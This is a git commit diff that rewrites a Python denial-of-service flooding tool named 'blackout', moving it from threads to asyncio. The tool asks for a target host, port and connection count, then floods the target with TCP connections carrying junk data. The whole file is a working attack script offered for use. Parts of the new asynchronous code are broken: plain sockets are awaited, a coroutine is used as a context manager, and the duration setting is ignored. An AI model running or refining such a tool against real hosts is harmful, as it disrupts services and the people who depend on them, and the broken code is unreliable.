f607cbeed53ddab3d4c2e7f03749ce48796f9e41
xxmathexx <101976624+xxmathexx@users.noreply.github.com>
2023-08-03 07:53:43 -0300

    main.py

--- main.py
+++ main.py
@@ -1,48 +1,42 @@
 import socket
 import hashlib
-import threading
+import asyncio
 import questionary
 import validators
-import time
+import colorama
 
-def blackout(ip, port, size, connections, finished_event):
+colorama.init(autoreset=True)
+
+async def blackout(ip, port, size, connections, attack_duration):
     data = hashlib.sha512(str(size).encode()).hexdigest()
     addr = (ip, port)
     errors = 0
-    socks = []
     
-    for _ in range(connections):
+    async def send_packet(sock):
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2.0)
-            sock.connect(addr)
-            socks.append(sock)
+            await sock.send(data.encode())
+            await sock.send('\r\n\r\n'.encode())
+            print(colorama.Fore.GREEN + f"🚀 Mandando chumbo em {ip}:{port}")
         except socket.error as e:
+            nonlocal errors
             errors += 1
-            print(f"[-] Error connecting to {ip}:{port}: {e}")
-            if len(socks) == 0:
-                finished_event.set()  # Sinaliza o término do ataque
-                return
+            print(colorama.Fore.RED + f"⛔ Erro, vê se tá tudo certo {ip}:{port}: {e}")
 
-    print(f"[*] Iniciando ataque em {ip}:{port} with {connections} connections...")
-    time.sleep(2.5)
+    async def connect():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2.0)
+        await asyncio.get_event_loop().sock_connect(sock, addr)
+        return sock
 
-    for sock in socks:
-        try:
-            sock.send(data.encode())
-            sock.send('\r\n\r\n'.encode())
-            print(f"Mandando chumbo em {ip}:{port}")
-        except socket.error as e:
-            errors += 1
-            print(f"[-] Erro, vê se tá tudo certo {ip}:{port}: {e}")
+    async def attack():
+        async with connect() as sock:
+            await send_packet(sock)
 
-    for sock in socks:
-        sock.close()
+    tasks = [attack() for _ in range(connections)]
+    await asyncio.gather(*tasks)
 
-    print("[*] Blackout attack finished")
-    print(f"[-] {errors} Errors")
-
-    finished_event.set()  # Sinaliza o término do ataque
+    print(colorama.Fore.CYAN + "[*] Blackout attack finished")
+    print(colorama.Fore.YELLOW + f"[-] {errors} Errors")
 
 def get_ip_or_domain(ip_or_domain):
     if validators.ipv4(ip_or_domain) or validators.ipv6(ip_or_domain):
@@ -53,8 +47,8 @@ def get_ip_or_domain(ip_or_domain):
     except socket.gaierror:
         raise ValueError(f"Invalid IP address or domain: {ip_or_domain}")
 
-def main():
-    print('''
+async def main():
+    print(colorama.Fore.MAGENTA + '''
     
   8P d8P 888'Y88 888 88e
  P d8P  888 ,'Y 888 888b
@@ -65,36 +59,25 @@ d8P d88 888,d88 888 88
     
     example_url = "Exemplo: www.example.com ou 93.184.216.34"
 
-    ip_or_domain = questionary.text(f"Enter the target IP address or domain ({example_url}):").ask()
+    ip_or_domain = questionary.text(colorama.Fore.CYAN + f"Enter the target IP address or domain ({example_url}):").ask()
     ip = get_ip_or_domain(ip_or_domain)
 
-    port = questionary.text("Enter the target port (default: 80):").ask()
+    port = questionary.text(colorama.Fore.CYAN + "Enter the target port (default: 80):").ask()
     port = int(port) if port else 80
 
-    size = questionary.text("Enter the packet size (default: 1024):").ask()
+    size = questionary.text(colorama.Fore.CYAN + "Enter the packet size (default: 1024):").ask()
     size = int(size) if size else 1024
 
-    connections = questionary.text("Enter the number of connections (default: 1000):").ask()
+    connections = questionary.text(colorama.Fore.CYAN + "Enter the number of connections (default: 1000):").ask()
     connections = int(connections) if connections else 1000
 
-    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading
+    attack_duration = questionary.text(colorama.Fore.CYAN + "Enter the attack duration in seconds (default: 60):").ask()
+    attack_duration = int(attack_duration) if attack_duration else 60
 
-    finished_event = threading.Event()  # Evento para sinalizar o término dos ataques
+    await asyncio.gather(*[blackout(ip, port, size, connections, attack_duration) for _ in range(10)])
 
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads, finished_event))
-        threads.append(thread)
-        thread.start()
-
-    # Aguarda o término de todos os ataques
-    for thread in threads:
-        thread.join()
-
-    # Exibe a mensagem de crédito após o término dos ataques
-    finished_event.wait()
-    print("Créditos para o Zed Hacking, kiba não puta")
+    print(colorama.Fore.YELLOW + "Créditos para o Zed Hacking, kiba não puta")
 
 if __name__ == "__main__":
-    main()
-            
+    asyncio.run(main())
+    
